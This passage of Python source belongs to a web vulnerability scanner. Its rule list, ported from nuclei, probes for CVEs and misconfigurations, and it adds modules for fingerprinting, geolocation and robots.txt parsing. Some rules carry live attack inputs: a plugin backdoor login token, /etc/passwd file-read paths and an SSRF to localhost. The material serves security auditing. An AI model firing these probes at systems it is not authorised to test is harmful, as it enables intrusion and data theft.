        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<psalm', '<projectFiles', 'xmlns:xsi'], 'condition': 'or'}],
    },
    {
        "id": 'imageresizer-debug-exposure', "name": 'ImageResizer Debug - Information Exposure',
        "severity": 'low', "path": '/resizer.debug.ashx',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ImageResizer Debug - Information Exposure (ported from nuclei template http/misconfiguration/imageresizer-debug-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ImageResizer.', 'Diagnostics', 'Configuration:', 'Registered plugins:'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-sbom', "name": 'Spring Boot Actuator SBOM - Exposure',
        "severity": 'low', "path": '/sbom',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Spring Boot Actuator SBOM - Exposure (ported from nuclei template http/misconfiguration/springboot/springboot-sbom.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v3+json', 'application/vnd.cyclonedx+json', 'application/spdx+json', 'application/vnd.syft+json'], 'condition': 'or'}],
    },
    {
        "id": 'python-setup-config', "name": 'Python Setup Configuration - Exposure',
        "severity": 'low', "path": '/setup.py',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Python Setup Configuration - Exposure (ported from nuclei template http/exposures/configs/python-setup-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['import os', 'find_packages', 'setup(', 'text/x-python'], 'condition': 'or'}],
    },
    {
        "id": 'sitecore-debug-page', "name": 'SiteCore Debug Page',
        "severity": 'low', "path": "/sitecore/'",
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'SiteCore Debug Page (ported from nuclei template http/misconfiguration/sitecore-debug-page.yaml)',
        "matchers": [{'type': 'status', 'status': [200, 404]}, {'type': 'word', 'part': 'all', 'words': ['extranet\\Anonymous'], 'condition': 'or'}],
    },
    {
        "id": 'drupal-directory-listing', "name": 'Drupal Directory Listing',
        "severity": 'low', "path": '/sites/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Drupal Directory Listing (ported from nuclei template http/misconfiguration/drupal-directory-listing.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of /', 'Last modified', 'Parent Directory'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-startup', "name": 'Springboot Actuator startup',
        "severity": 'low', "path": '/startup',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Springboot Actuator startup (ported from nuclei template http/misconfiguration/springboot/springboot-startup.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['springBootVersion', 'startTime', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v1+json', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v3+json'], 'condition': 'or'}],
    },
    {
        "id": 'springboot-threaddump', "name": 'Detect Springboot Thread Dump page',
        "severity": 'low', "path": '/threaddump',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect Springboot Thread Dump page (ported from nuclei template http/misconfiguration/springboot/springboot-threaddump.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"threads":', '"threadName":', 'application/vnd.spring-boot.actuator', 'application/vnd.spring-boot.actuator.v2+json', 'application/vnd.spring-boot.actuator.v1+json'], 'condition': 'or'}],
    },
    {
        "id": 'token-json', "name": 'Token Json File Disclosure',
        "severity": 'low', "path": '/token.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Token Json File Disclosure (ported from nuclei template http/exposures/files/token-json.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"access_token":', '"token_type":'], 'condition': 'or'}],
    },
    {
        "id": 'ruijie-phpinfo', "name": 'Ruijie Phpinfo Configuration - Detect',
        "severity": 'low', "path": '/tool/view/phpinfo.view.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Ruijie Phpinfo Configuration - Detect (ported from nuclei template http/exposures/configs/ruijie-phpinfo.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['PHP Version', 'PHP Extension'], 'condition': 'or'}],
    },
    # ── Unauthenticated / anonymous access, nuclei templates added 2025-2026 ──
    # Generated by mine_unauth.py and passed through validate_rules.py decoys.
    # WordPress readme.txt version probes excluded on purpose (noise, not access).
    {
        "id": 'CVE-2026-18072', "name": 'Advanced Responsive Video Embedder 10.8.7/10.8.8 - Hardcoded Backdoor Authentica',
        "severity": 'critical', "path": '/?_wplogin=35fe7057ffed92ff7bc5a0b90f302a77fb5843ad6c972294d68da0b0553b3900',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-09-10',
        "description": 'Advanced Responsive Video Embedder 10.8.7/10.8.8 - Hardcoded Backdoor Authentication Bypass (ported from nuclei template http/cves/2026/CVE-2026-18072.yaml)',
        "matchers": [{'type': 'status', 'status': [200, 302]}, {'type': 'word', 'part': 'all', 'words': ['/wp-admin/'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-21445', "name": 'Langflow - Broken Access Control',
        "severity": 'critical', "path": '/api/v1/monitor/messages',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-03-25',
        "description": 'Langflow - Broken Access Control (ported from nuclei template http/cves/2026/CVE-2026-21445.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"text":', '"timestamp":'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-59774', "name": 'Gitea 1.22.1-1.27.0 - Unauthenticated Arbitrary File Read',
        "severity": 'critical', "path": '/api/v1/repos/search?limit=1',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-08-10',
        "description": 'Gitea 1.22.1-1.27.0 - Unauthenticated Arbitrary File Read (ported from nuclei template http/cves/2026/CVE-2026-59774.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['chroma language-bash'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2024-40711', "name": 'Veeam Backup & Replication - Unauthenticated',
        "severity": 'critical', "path": '/api/v1/serverinfo',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2025-09-24',
        "description": 'Veeam Backup & Replication - Unauthenticated (ported from nuclei template http/cves/2024/CVE-2024-40711.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"databaseVendor":', '"databaseContentVersion":'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-42281', "name": 'MagicMirror <= 2.35.0 - Server-Side Request Forgery',
        "severity": 'critical', "path": '/cors?url=http://127.0.0.1:8080/version',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-05-11',
        "description": 'MagicMirror <= 2.35.0 - Server-Side Request Forgery (ported from nuclei template http/cves/2026/CVE-2026-42281.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['MagicMirror'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2025-49001', "name": 'DataEase < 2.10.10 - JWT Authentication Bypass',
        "severity": 'critical', "path": '/de2api/user/info',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-05-18',
        "description": 'DataEase < 2.10.10 - JWT Authentication Bypass (ported from nuclei template http/cves/2025/CVE-2025-49001.yaml)',
        "matchers": [{'type': 'status', 'status': [200, 400]}, {'type': 'word', 'part': 'all', 'words': ['de-gateway-flag', 'hmacsha256', 'getWriter() has already been called'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-67208', "name": 'Juggle <= 1.6.0 - Unauthenticated Exposed H2 Database Console',
        "severity": 'critical', "path": '/h2-console/',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-08-08',
        "description": 'Juggle <= 1.6.0 - Unauthenticated Exposed H2 Database Console (ported from nuclei template http/cves/2026/CVE-2026-67208.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>H2 Console</title>', 'login.jsp?jsessionid='], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2023-49230', "name": 'Peplink Balance Two before 8.4.0 - Unauthenticated Config Upload',
        "severity": 'high', "path": '/cgi-bin/MANGA/index.cgi',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2025-07-08',
        "description": 'Peplink Balance Two before 8.4.0 - Unauthenticated Config Upload (ported from nuclei template http/cves/2023/CVE-2023-49230.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Peplink', '"status": "save_success"'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2025-55523', "name": 'Agent-Zero 0.8.0 - 0.9.4 - Arbitrary File Download',
        "severity": 'high', "path": '/download_work_dir_file?path=/etc/passwd',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2025-11-19',
        "description": 'Agent-Zero 0.8.0 - 0.9.4 - Arbitrary File Download (ported from nuclei template http/cves/2025/CVE-2025-55523.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['filename=passwd'], 'condition': 'or'}],
    },
    {
        "id": 'http-etcd-unauthenticated-raft', "name": 'etcd RAFT Unauthenticated API',
        "severity": 'high', "path": '/members',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-09-16',
        "description": 'etcd RAFT Unauthenticated API (ported from nuclei template http/misconfiguration/etcd-unauthenticated-raft.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['peerURLs', 'clientURLs'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-4020', "name": 'Gravity SMTP WordPress Plugin - Sensitive Information Exposure',
        "severity": 'high', "path": '/wp-json/gravitysmtp/v1/tests/mock-data?page=gravitysmtp-settings',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-03-31',
        "description": 'Gravity SMTP WordPress Plugin - Sensitive Information Exposure (ported from nuclei template http/cves/2026/CVE-2026-4020.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['gravitysmtp_admin_config', 'system_report_clipboard', 'feature_flags'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2025-1232', "name": 'Site Reviews < 7.2.5 - Unauthenticated Stored XSS',
        "severity": 'high', "path": '/wp-json/wp/v2/pages?per_page=100',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-02-09',
        "description": 'Site Reviews < 7.2.5 - Unauthenticated Stored XSS (ported from nuclei template http/cves/2025/CVE-2025-1232.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"success":true', 'javascript:alert(document.domain)'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-27796', "name": 'Homarr < 1.54.0 - Information Disclosure',
        "severity": 'medium', "path": '/api/trpc/integration.all',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-08-08',
        "description": 'Homarr < 1.54.0 - Information Disclosure (ported from nuclei template http/cves/2026/CVE-2026-27796.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"result":{"data":{"json":', '"kind":"', 'UNAUTHORIZED'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-6826', "name": 'Concrete CMS <9.5.1 - Unauthenticated File Usage Disclosure',
        "severity": 'medium', "path": '/ccm/system/dialogs/file/usage/1',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-08-09',
        "description": 'Concrete CMS <9.5.1 - Unauthenticated File Usage Disclosure (ported from nuclei template http/cves/2026/CVE-2026-6826.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ccm-ui', 'Page ID', 'Handle', 'Location'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2024-30570', "name": 'Netgear R6850 - Information Disclosure',
        "severity": 'medium', "path": '/debuginfo.htm',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2025-03-26',
        "description": 'Netgear R6850 - Information Disclosure (ported from nuclei template http/cves/2024/CVE-2024-30570.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<br>WAN connection type'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-29066', "name": 'TinaCMS - Path Traversal',
        "severity": 'medium', "path": '/etc/passwd',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-04-07',
        "description": 'TinaCMS - Path Traversal (ported from nuclei template http/cves/2026/CVE-2026-29066.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['tina-tailwind', 'root:x:0:0'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-8236', "name": 'Concrete CMS <9.5.1 - Unauthenticated File-Usage Internal Metadata Disclosure',
        "severity": 'medium', "path": '/index.php/ccm/system/dialogs/file/usage/1',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-08-15',
        "description": 'Concrete CMS <9.5.1 - Unauthenticated File-Usage Internal Metadata Disclosure (ported from nuclei template http/cves/2026/CVE-2026-8236.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<td>Page ID</td>', 'class="ccm-ui"', '<td>Handle</td>'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2024-54764', "name": 'ipTIME A2004 - Unauthorized Access',
        "severity": 'medium', "path": '/login/hostinfo2.cgi',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2025-03-11',
        "description": 'ipTIME A2004 - Unauthorized Access (ported from nuclei template http/cves/2024/CVE-2024-54764.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['product_name=', 'system_type='], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2025-58226', "name": 'WordPress 3D FlipBook Plugin <= 1.16.17 - Sensitive Information Exposure',
        "severity": 'medium', "path": '/wp-admin/admin-ajax.php?action=fb3d_send_posts',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-04-23',
        "description": 'WordPress 3D FlipBook Plugin <= 1.16.17 - Sensitive Information Exposure (ported from nuclei template http/cves/2025/CVE-2025-58226.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"code":', '"posts":', '"title":', '"post_type":"3d-flip-book"'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2024-13126', "name": 'WordPress Download Manager < 3.3.07 - Unauthenticated Data Exposure',
        "severity": 'medium', "path": '/wp-content/uploads/download-manager-files/',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2025-04-05',
        "description": 'WordPress Download Manager < 3.3.07 - Unauthenticated Data Exposure (ported from nuclei template http/cves/2024/CVE-2024-13126.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Index of /wp-content/uploads/download-', 'Last modified'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-13153', "name": 'Essential Blocks < 6.4.0 - Information Disclosure',
        "severity": 'medium', "path": '/wp-json/essential-blocks/v1/products?per_page=20',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-09-11',
        "description": 'Essential Blocks < 6.4.0 - Information Disclosure (ported from nuclei template http/cves/2026/CVE-2026-13153.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"sold_count":', '"title"'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2026-0717', "name": 'LottieFiles for Gutenberg <= 3.0.0 - Unauthenticated Settings Disclosure',
        "severity": 'medium', "path": '/wp-json/lottiefiles/v1/settings/',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2026-08-15',
        "description": 'LottieFiles for Gutenberg <= 3.0.0 - Unauthenticated Settings Disclosure (ported from nuclei template http/cves/2026/CVE-2026-0717.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['is_block_logged_in'], 'condition': 'or'}],
    },
    {
        "id": 'CVE-2024-45591', "name": 'XWiki Platform - Unauthorized Document History Access',
        "severity": 'medium', "path": '/xwiki/rest/wikis/xwiki/spaces/Main/pages/WebHome/history',
        "matchers_condition": "and", "origin": "nuclei-unauth",
        "added": '2025-02-11',
        "description": 'XWiki Platform - Unauthorized Document History Access (ported from nuclei template http/cves/2024/CVE-2024-45591.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['historySummary', 'pageId', 'comment'], 'condition': 'or'}],
    },
]


def _run_vuln_rules(domain, base_sigs=None, timeout=7, brand=None):
    """
    Execute the rule playbook against a target, nuclei-style.
    Every rule requires product + vulnerability evidence, so a generic
    catch-all/soft-404 page cannot satisfy it.
    """
    if not HAS_REQUESTS:
        return []
    H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
         "Accept": "*/*"}
    findings = []
    _lk = __import__("threading").Lock()

    def run(rule):
        for scheme in ("https", "http"):
            url = f"{scheme}://{domain}{rule['path']}"
            try:
                r = requests.get(url, headers=H, timeout=timeout,
                                 verify=False, allow_redirects=False)
            except Exception:
                continue
            if base_sigs and _is_catchall(r, base_sigs):
                return
            if _looks_soft_404(r):
                return
            # The site's own routing/search page answering for this path is not
            # product evidence (e.g. GitHub serves "phpMyAdmin · GitHub" for
            # /phpmyadmin/). We test for the *site brand* rather than a bare path
            # echo, because for real products the path and the product name are
            # legitimately the same (phpinfo.php → "phpinfo()").
            if _is_site_own_page(r, brand):
                return
            # Scrub the requested path so product matchers can't match the URL
            # echoed back. Only whole-path forms and long segments are removed —
            # scrubbing short tokens (e.g. "php" from /phpinfo.php) would also
            # destroy legitimate body text such as "PHP Version".
            from urllib.parse import quote as _q
            p = rule["path"]
            scrub = {p, p.strip("/"), _q(p), p.lower(), domain}
            for seg in p.strip("/").split("/"):
                if len(seg) >= 8:
                    scrub.add(seg)
            scrub = {s for s in scrub if s and len(s) >= 5}
            if _eval_rule(r, rule, scrub):
                with _lk:
                    findings.append({
                        "name": rule["name"],
                        "severity": rule["severity"],
                        "path": rule["path"],
                        "url": url,
                        "status": r.status_code,
                        "size": len(r.content),
                        "description": rule.get("description", ""),
                        "rule_id": rule["id"],
                        "source": "rule_playbook",
                    })
            return

    all_rules = VULN_RULES + [r for r in VULN_RULES_EXTENDED
                              if r["path"] not in {x["path"] for x in VULN_RULES}]
    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        list(ex.map(run, all_rules))
    return findings


def _page_title(r, n=200_000):
    """
    Return the <title> (and first <h1>) text of a response.

    The window is large because real pages often carry a huge <head> full of
    preload/meta tags before the title — GitHub's sits ~17 KB in, so a small
    window silently returned nothing and defeated the echo checks.
    """
    import re as _re
    try:
        head = (r.text or "")[:n]
    except Exception:
        return ""
    out = []
    for pat in (r'<title[^>]*>(.{0,200}?)</title>', r'<h1[^>]*>(.{0,200}?)</h1>'):
        m = _re.search(pat, head, _re.I | _re.S)
        if m:
            out.append(_re.sub(r'<[^>]+>', ' ', m.group(1)))
    return " ".join(out).strip()


def _echoes_path(r, path):
    """
    True if the page merely reflects the requested path back at us.

    Sites with catch-all routing (search pages, SPAs, CMS 'did you mean'
    handlers) answer /phpmyadmin/ with a 200 page titled "phpMyAdmin · Site".
    Matching a product name in that page is a false positive — the product is
    not installed, the path is just being echoed.
    """
    title = _page_title(r).lower()
    if not title:
        return False
    for seg in (path or "").strip("/").replace(".", "/").split("/"):
        seg = seg.strip().lower()
        if len(seg) >= 4 and seg in title:
            return True
    return False


def _site_brand(domain, homepage_resp=None):
    """Brand token from the homepage <title>, used to spot the site's own pages."""
    if homepage_resp is not None:
        t = _page_title(homepage_resp)
        if t:
            import re as _re
            parts = [p.strip() for p in _re.split(r'[·|\-–—:]', t) if p.strip()]
            if parts:
                cand = min(parts, key=len)
                if 3 <= len(cand) <= 30:
                    return cand.lower()
    return (domain.split(".")[0] or "").lower()


def _is_site_own_page(r, brand):
    """
    True if the response is one of the site's own templated pages.

    If a probe for /phpmyadmin/ returns a page whose title carries the site's
    brand ("phpMyAdmin · GitHub"), it is the target's own routing/search page,
    not an exposed third-party product.
    """
    if not brand or len(brand) < 3:
        return False
    return brand in _page_title(r).lower()


def _looks_soft_404(r):
    """
    True if a 200-OK response is really a 'not found' page.

    Many sites (SPAs, e-commerce platforms, custom error handlers) answer every
    unknown path with HTTP 200 and a friendly 404 page. Without this check a
    scanner treats those as real hits — the classic cause of phantom findings.
    """
    try:
        if r.status_code != 200:
            return False
        head = (r.text or "")[:4000]
    except Exception:
        return False
    import re as _re
    NOTFOUND = (r'404|not[\s\-]?found|page (?:not found|introuvable|non trouv)|'
                r'no s?e encontr|nicht gefunden|doesn.?t exist|does not exist|'
                r'page unavailable|oops|sorry')
    # Only trust prominent locations — <title> and headings — so a stray "404"
    # somewhere in a legitimate page body never trips this.
    for pat in (r'<title[^>]*>(.{0,120}?)</title>',
                r'<h1[^>]*>(.{0,120}?)</h1>',
                r'<h2[^>]*>(.{0,120}?)</h2>'):
        for m in _re.finditer(pat, head, _re.I | _re.S):
            if _re.search(NOTFOUND, m.group(1), _re.I):
                return True
    return False


def _path_variants(path):
    """All textual forms of a request path, so they can be scrubbed from a
    response before matching product names (a path echo is not evidence)."""
    out = set()
    if not path:
        return out
    from urllib.parse import quote as _q
    p = path.strip()
    out.update({p, p.strip("/"), _q(p), _q(p).lower(), p.lower(), p.replace("/", "")})
    for seg in p.strip("/").replace(".", "/").split("/"):
        if len(seg) >= 3:
            out.add(seg)
            out.add(seg.lower())
    return {v for v in out if len(v) >= 3}


def _extract_version(banner, service):
    """Extract software name + version from a service banner string."""
    if not banner:
        return ""
    import re as _re
    patterns = [
        # SSH: "SSH-2.0-OpenSSH_8.2p1"
        (_re.search(r'SSH-[\d.]+-(\S+)', banner), lambda m: m.group(1)),
        # HTTP Server header: "Server: Apache/2.4.41"
        (_re.search(r'Server:\s*([^\s|]+)', banner, _re.I), lambda m: m.group(1)[:60]),
        # FTP: "220 ProFTPD 1.3.5e"
        (_re.search(r'220[- ](.+?)(?:\s*\||\s*$)', banner), lambda m: m.group(1)[:60]),
        # SMTP: "220 mail.example.com ESMTP Postfix"
        (_re.search(r'ESMTP\s+(\S+)', banner, _re.I), lambda m: "SMTP/" + m.group(1)),
        # Generic: "nginx/1.18.0" or "Apache/2.4.41"
        (_re.search(r'(nginx|apache|lighttpd|iis|tomcat|jetty|gunicorn|uwsgi|caddy)[/\s]+([\d.]+)', banner, _re.I),
         lambda m: f"{m.group(1)}/{m.group(2)}"),
        # MySQL: "5.7.32-log"
        (_re.search(r'(\d+\.\d+\.\d+[^\s|]*)', banner), lambda m: m.group(1)[:30]),
    ]
    for match, extractor in patterns:
        if match:
            try:
                return extractor(match)
            except Exception:
                pass
    # Fallback: return first meaningful word
    words = banner.split()
    if words and len(words[0]) > 2:
        return words[0][:40]
    return ""


# ═══════════════════════════════════════════════════════════════
# MODULE: TECH
# ═══════════════════════════════════════════════════════════════

def scan_tech(domain):
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    resp = None
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(f"{scheme}://{domain}", timeout=10, allow_redirects=True,
                                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            break
        except Exception:
            continue
    if not resp:
        return {"error": "cannot connect"}

    body = resp.text[:80000]
    hdrs = str(resp.headers).lower()
    combined = body + hdrs
    detected = {}

    categories = {
        "CMS": {"WordPress": [r'wp-content', r'wp-includes'], "Drupal": [r'Drupal', r'sites/default/files'],
                 "Joomla": [r'/media/jui/'], "Shopify": [r'cdn\.shopify\.com'], "Wix": [r'wix\.com'],
                 "Squarespace": [r'squarespace\.com'], "Webflow": [r'webflow\.com'], "Magento": [r'Magento']},
        "Frontend": {"React": [r'react\.production', r'react-dom'], "Vue.js": [r'vue\.js', r'Vue\.component'],
                     "Angular": [r'ng-app', r'ng-version'], "jQuery": [r'jquery'], "Next.js": [r'__NEXT_DATA__'],
                     "Nuxt.js": [r'__NUXT__'], "Bootstrap": [r'bootstrap\.min'], "Tailwind": [r'tailwindcss']},
        "CDN": {"Cloudflare": [r'cloudflare', r'cf-ray'], "AWS CloudFront": [r'cloudfront\.net'],
                "Fastly": [r'fastly'], "Vercel": [r'vercel'], "Netlify": [r'netlify']},
        "Analytics": {"Google Analytics": [r'google-analytics\.com', r'gtag\('], "Facebook Pixel": [r'connect\.facebook\.net'],
                      "Hotjar": [r'hotjar\.com'], "Segment": [r'segment\.com']},
        "Security": {"Cloudflare WAF": [r'cf-ray'], "reCAPTCHA": [r'recaptcha'], "hCaptcha": [r'hcaptcha\.com'],
                     "Sucuri WAF": [r'sucuri'], "Imperva": [r'incapsula']},
    }

    for cat, techs in categories.items():
        found = []
        for name, patterns in techs.items():
            for p in patterns:
                if re.search(p, combined, re.IGNORECASE):
                    found.append(name); break
        if found:
            detected[cat] = found

    srv = resp.headers.get("Server", "")
    if srv:
        detected["Server"] = [srv]
    pb = resp.headers.get("X-Powered-By", "")
    if pb:
        detected["Runtime"] = [pb]

    return detected


# ═══════════════════════════════════════════════════════════════
# MODULE: GEO
# ═══════════════════════════════════════════════════════════════

def scan_geo(domain):
    ips = resolve(domain)
    if not ips["v4"]:
        return {"error": "cannot resolve"}
    ip = ips["v4"][0]
    r = req(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,hosting")
    if not r:
        return {"error": "geo API unreachable"}
    try:
        d = r.json()
        if d.get("status") != "success":
            return {"error": "lookup failed"}
        return {
            "ip": ip, "hostname": d.get("reverse", ""), "country": d.get("country", ""),
            "country_code": d.get("countryCode", ""),
            "flag": "".join(chr(0x1F1E6+ord(c)-ord('A')) for c in (d.get("countryCode","") or "").upper() if c.isalpha()) if len((d.get("countryCode","") or ""))==2 else "",
            "region": d.get("regionName", ""),
            "city": d.get("city", ""), "lat": d.get("lat"), "lon": d.get("lon"),
            "timezone": d.get("timezone", ""), "isp": d.get("isp", ""),
            "org": d.get("org", ""), "asn": d.get("as", ""),
            "is_hosting": d.get("hosting", False),
        }
    except Exception:
        return {"error": "parse error"}


# ═══════════════════════════════════════════════════════════════
# MODULE: ROBOTS
# ═══════════════════════════════════════════════════════════════

def _get_any_scheme(domain, path, timeout=10, allow_redirects=True):
    """
    Fetch a path over HTTPS, falling back to HTTP, tolerating invalid certs.

    Modules that hard-coded `https://` with certificate verification silently
    returned nothing for HTTP-only hosts and for hosts with self-signed or
    expired certificates — exactly the targets a scanner most needs to inspect.
    """
    if not HAS_REQUESTS:
        return None
    H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
    for scheme in ("https", "http"):
        try:
            return requests.get(f"{scheme}://{domain}{path}", timeout=timeout,
                                headers=H, verify=False, allow_redirects=allow_redirects)
        except Exception:
            continue
    return None


def scan_robots(domain):
    results = {"robots": None, "security_txt": None, "sitemaps": []}
    if not HAS_REQUESTS:
        return results

    try:
        r = _get_any_scheme(domain, "/robots.txt", timeout=10)
        if r is not None and r.status_code == 200 and r.text.strip():
            disallowed = []
            sitemaps = []
            sensitive_kw = ["admin", "login", "api", "config", "backup", "db", "private", "secret",
                            "internal", "panel", "dashboard", "wp-admin", "cpanel", "phpmyadmin",
                            ".env", ".git", "debug", "cgi-bin", "server-status", "xmlrpc"]
            allowed   = []
            skip_ext  = ('.css','.js','.png','.jpg','.jpeg','.gif','.svg','.ico','.woff','.woff2','.ttf','.eot','.map')
            for line in r.text.strip().split("\n"):
                line = line.strip()
                ll = line.lower()
                if ll.startswith("disallow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and not any(path.lower().endswith(e) for e in skip_ext):
                        is_sensitive = any(k in path.lower() for k in sensitive_kw)
                        disallowed.append({"path": path, "sensitive": is_sensitive})
                elif ll.startswith("allow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/" and not any(path.lower().endswith(e) for e in skip_ext):
                        allowed.append({"path": path, "interesting": any(k in path.lower() for k in sensitive_kw)})
                elif ll.startswith("sitemap:"):
                    sitemaps.append(line[line.lower().index("sitemap:") + 8:].strip())
            results["robots"] = {"disallowed": disallowed, "allowed": allowed, "count": len(disallowed)}
            results["sitemaps"] = sitemaps
    except Exception:
        pass

    for path in ["/.well-known/security.txt", "/security.txt"]:
        try:
            r = _get_any_scheme(domain, path, timeout=8)
            if r.status_code == 200 and "contact" in r.text.lower():
                results["security_txt"] = {"path": path, "content": r.text[:500]}
                break
        except Exception:
            pass

    return results


# ═══════════════════════════════════════════════════════════════
# SHARED: CATCH-ALL / WAF BASELINE DETECTION
# ═══════════════════════════════════════════════════════════════
# Many hosts (WAF, SPA, catch-all vhosts) return the SAME response — a generic
